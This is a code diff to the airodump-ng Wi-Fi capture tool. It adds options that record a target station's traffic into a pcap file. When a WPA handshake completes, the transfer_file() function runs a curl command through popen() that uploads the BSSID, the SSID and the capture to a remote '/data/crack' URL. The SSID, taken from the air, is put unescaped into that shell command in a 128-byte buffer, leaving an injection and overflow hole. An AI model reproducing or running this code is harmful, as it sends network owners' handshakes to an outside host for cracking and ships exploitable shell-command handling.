@@ -452,6 +452,32 @@ int dump_initialize( char *prefix, int ivs_only )
     return( 0 );
 }
 
+int initialize_dump_filename( char *prefix)
+{
+	int ofn_len;
+	char * ofn = NULL;
+	
+	if ( prefix == NULL || strlen( prefix ) == 0) {
+		perror( "please input dump file name!" );
+		return( 1 );
+	}
+	
+	ofn_len = strlen(prefix) +5+1+3+1; //path+'.'+cap+tail
+	ofn = (char *)calloc(1, ofn_len);
+	
+	memset(ofn, 0, ofn_len);
+	snprintf( ofn,  ofn_len, "/tmp/%s.%s",
+			 	prefix, AIRODUMP_NG_CAP_EXT );
+	G.f_kcap_name = (char *) malloc( strlen( ofn ) + 1 );
+	if(G.f_kcap_name == NULL) {
+		perror( "alloc file name failed!" );
+		return (1);
+	}
+	memcpy( G.f_kcap_name, ofn, strlen( ofn ) + 1 );
+	free( ofn );
+	return (0);
+}
+
 #ifdef	RATE_ESTIMATOR
 int update_dataps()
 {
@@ -586,6 +612,104 @@ int list_check_decloak(struct pkt_buf **list, int length, unsigned char* packet)
     }
 
     return 1; //didn't find decloak
+}
+
+int write_file(unsigned char* packet, int length)
+{
+	FILE *f;
+	struct pcap_file_header pfh;
+	struct pcap_pkthdr pkh;
+	struct timeval tv;
+	int n;
+	
+	if( G.f_kcap_name == NULL ) {
+		printf("Please specify an output file (-k).\n");
+		return 1;
+	}
+	
+	if(G.first_packet) {
+		if( ( f = fopen( G.f_kcap_name, "wb+" ) ) == NULL ) {
+			fprintf( stderr, "failed: fopen(%s,wb+)\n", G.f_kcap_name );
+			return( 1 );
+		}
+		
+		pfh.magic           = TCPDUMP_MAGIC;
+		pfh.version_major   = PCAP_VERSION_MAJOR;
+		pfh.version_minor   = PCAP_VERSION_MINOR;
+		pfh.thiszone        = 0;
+		pfh.sigfigs         = 0;
+		pfh.snaplen         = 65535;
+		pfh.linktype        = LINKTYPE_IEEE802_11;
+		
+		n = sizeof( struct pcap_file_header );
+		if( fwrite( &pfh, 1, n, f ) != (size_t) n ) {
+			fprintf( stderr, "failed: fwrite(pcap file header)\n" );
+			fclose( f );
+			return( 1 );
+		}
+	}
+	else {
+		if( ( f = fopen( G.f_kcap_name, "ab+" ) ) == NULL ) {
+			fprintf( stderr, "failed: fopen(%s,ab+)\n", G.f_kcap_name );
+			return( 1 );
+		}
+	}
+	
+	gettimeofday( &tv, NULL );
+	
+	pkh.tv_sec  = tv.tv_sec;
+	pkh.tv_usec = tv.tv_usec;
+	pkh.len     = length;
+	pkh.caplen  = length;
+	
+	n = sizeof( pkh );
+	
+	if( fwrite( &pkh, 1, n, f ) != (size_t) n ) {
+		fprintf( stderr, "fwrite(packet header) failed\n" );
+		fclose( f );
+		return( 1 );
+	}
+	
+	n = length;
+	
+	if( fwrite( packet, 1, n, f ) != (size_t) n ) {
+		fprintf( stderr, "fwrite(packet data) failed\n");
+		fclose( f );
+		return( 1 );
+	}
+	
+	fclose( f );
+	
+	if(G.first_packet) {
+		G.first_packet = 0;
+	}
+	
+	return 0;
+}
+
+int transfer_file(struct ST_info *sta)
+{
+	FILE *fp;
+	char buff[128] = {0};
+	memset(buff,'\x00',sizeof(buff));
+	sprintf(buff,"curl -F \"a=%d\" -F \"bssid=%02X%02X%02X%02X%02X%02X\" -F \"ssid=%s\" -F \"file=@%s\" %s",2,G.f_bssid[0],
+			G.f_bssid[1],G.f_bssid[2],G.f_bssid[3],G.f_bssid[4],G.f_bssid[5],sta->base->essid,G.f_kcap_name,"http://safetest.kunteng.org:80/data/crack");
+	
+	if((fp = popen(buff,"r")) == NULL) {
+		perror("Failed to popen\n");
+		exit(1);
+	}
+	sleep(5);
+	
+	memset(buff,'\x00',sizeof(buff));
+	while(fgets(buff,sizeof(buff)-1,fp) != NULL) {
+		//printf("%s",buff);
+	}
+	pclose(fp);
+	
+	sta->wpa.state = 0;
+	G.first_packet = 1;
+	return 0;
 }
 
 int dump_add_packet( unsigned char *h80211, int caplen, struct rx_info *ri, int cardnum )
@@ -1733,6 +1857,17 @@ skip_probe:
                     }
                 }
             }
+			
+			if( G.f_kcap_name != NULL && ( memcmp(G.f_bssid, st_cur->base->bssid, 6) == 0 ) && (memcmp(G.station,st_cur->stmac,6) == 0)) 
+			{
+				if(st_cur->wpa.state == 7) {
+					write_file(h80211,caplen);
+					transfer_file(st_cur);
+				} else {
+					write_file(h80211,caplen);
+				}
+				
+			}
         }
     }
 
@@ -4506,6 +4641,8 @@ int main( int argc, char *argv[] )
         {"write-interval", 1, 0, 'I'},
         {"wps",  0, 0, 'W'},
 		{"rest-port", 1, 0, 'p'},
+		{"out-kcap",   1, 0, 'k'},
+		{"station",   1, 0, 'n'},
         {0,          0, 0,  0 }
     };
 
@@ -4550,6 +4687,7 @@ int main( int argc, char *argv[] )
     G.singlechan   =  0;
     G.singlefreq   =  0;
     G.dump_prefix  =  NULL;
+	G.dump_kprefix  =  NULL; //caizhibang add
     G.record_data  =  0;
     G.f_cap        =  NULL;
     G.f_ivs        =  NULL;
@@ -4596,6 +4734,7 @@ int main( int argc, char *argv[] )
     G.file_write_interval = 5; // Write file every 5 seconds by default
     G.maxsize_wps_seen  =  6;
     G.show_wps     = 0;
+	G.first_packet = 1; //caizhibang add
 #ifdef HAVE_PCRE
     G.f_essid_regex = NULL;
 #endif
@@ -4683,7 +4822,7 @@ int main( int argc, char *argv[] )
         option_index = 0;
 
         option = getopt_long( argc, argv,
-                        "b:c:egiw:s:t:u:m:Dd:N:R:aHDB:Ahf:r:EC:o:p:Xx:MUI:W",
+                        "b:c:egiw:s:t:u:m:Dd:N:R:aHDB:Ahf:r:EC:o:p:Xx:k:MUI:W",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -4892,6 +5031,14 @@ int main( int argc, char *argv[] )
                 }
                 G.s_file = optarg;
                 break;
+			
+			case 'k':
+				if (G.dump_kprefix != NULL) {
+					printf( "Notice: dump prefix already given\n" );
+					break;
+				}
+				 G.dump_kprefix   = optarg;
+				break;
 
             case 's':
 
@@ -4965,6 +5112,14 @@ int main( int argc, char *argv[] )
                     return( 1 );
                 }
                 break;
+			
+			case 'n':
+				if(getmac(optarg, 1, G.station) != 0) {
+					printf("Notice: invalid station\n");
+					printf("\"%s --help\" for help.\n", argv[0]);
+					return( 1 );
+				}
+				break;
 
             case 'N':
 
@@ -5309,6 +5464,11 @@ usage:
     if (G.record_data)
     	if( dump_initialize( G.dump_prefix, ivs_only ) )
     	    return( 1 );
+	
+	if(G.dump_kprefix) {
+		if(initialize_dump_filename(G.dump_kprefix))
+			return (1);
+	}
 
 
     /* fill oui struct if ram is greater than 32 MB */
@@ -5700,6 +5860,9 @@ usage:
 
     if(G.f_cap_name)
         free(G.f_cap_name);
+	
+	if(G.f_kcap_name)
+		free(G.f_kcap_name);
 
     if(G.keyout)
         free(G.keyout);
